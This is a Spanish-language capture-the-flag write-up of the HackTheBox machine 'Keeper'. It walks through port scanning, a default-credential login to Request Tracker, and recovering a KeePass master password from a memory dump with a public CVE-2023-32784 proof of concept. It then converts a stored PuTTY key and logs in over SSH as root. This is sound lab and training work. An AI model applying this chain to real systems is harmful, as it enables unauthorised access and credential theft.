# Keeper

Plataforma: HackTheBox
OS: Linux
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 30 de enero de 2025 21:29
IP: 10.10.11.227

## Recopilación de información

<aside>
💡 Reconocimiento general

</aside>

Sistema

```bash
whichSystem.py 10.10.11.227

	10.10.11.227 (ttl -> 63): Linux

```

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 10.10.11.227 -oG targeted

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
sudo nmap -p22,80 -sCV 10.10.11.227 -oN targeted
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- **Identificación de vulnerabilidades**
    - 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
    - 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3

- Enumeracion web
    
    ![image.png](<imagenes/image 115.png>)
    
    ![image.png](<imagenes/image 116.png>)
    

Añadimos al /etc/host : tickets.keeper.htb

![image.png](<imagenes/image 117.png>)

Vemos que usa “Request Tracker”

Buscamos las credenciales por defecto : root/password

Nos logamos en el panel

![image.png](<imagenes/image 118.png>)

Vamos a la seccion Usuarios y vemos

Usuario: lnorgaard

![image.png](<imagenes/image 119.png>)

Probamos a acceder por SSH : Explotacion 1

## Explotación

<aside>
💡 Probamos diferentes accesos

</aside>

### Explotación 1

```bash
ssh lnorgaard@ssh 10.10.11.227

The authenticity of host '10.10.11.227 (10.10.11.227)' can't be established.
ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.227' (ED25519) to the list of known hosts.
lnorgaard@10.10.11.227's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
lnorgaard@keeper:~$ cat user.txt 
791774e6eca0481f1a79d0919f468b45
lnorgaard@keeper:~$ 

```

Descargamos el fichero RT30000.zip

```bash
# Maquina atacante

❯ scp lnorgaard@10.10.11.227:/home/lnorgaard/RT30000.zip ../content
❯ ls
 RT30000.zip
❯ unzip RT30000.zip
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx          
❯ ls
 KeePassDumpFull.dmp   passcodes.kdbx   RT30000.zip

```

Vemos que es posible extraer la contraseña maestra de KeePassDumpFUll.dmp debido al CVE-2023-32784  

Buscamos un exploot

### Explotación 2

```bash
gitclone https://github.com/dawnl3ss/CVE-2023-32784.git
cd CVE-2023-32784
python3 poc.py KeePassDumpFull.dmp

●Mdgr●d med fl●de
```

Si buscamos el resultado en google aparece que es un postre de dinamarca:

***rødgrød med fløde***

Instalamos KeePass y abrimos el fichero con la contraseña

![image.png](<imagenes/image 120.png>)

![image.png](<imagenes/image 121.png>)

El formato es un formato de ppk (Putty Private Key)

Convertimos el formato a id_rsa

```bash
puttygen private.ppk -O private-openssh -o id_rsa
chmod 600 id_rsa
 
```

### Explotación posterior

<aside>
💡 Accedemos con las credenciales encontradas

</aside>

### Escalada de privilegios

```bash
 ssh -i id_rsa root@10.10.11.227
 root@keeper:~# ls
 root@keeper:~# cat root.txt 
ce5c3b996b4b28e54bce317a959be019
root@keeper:~# 
```

## Conclusión

<aside>
💡 Maquina facil que me ha dado trabajo encontrar que era formato ppk y convertirlo en id_rsa

</aside>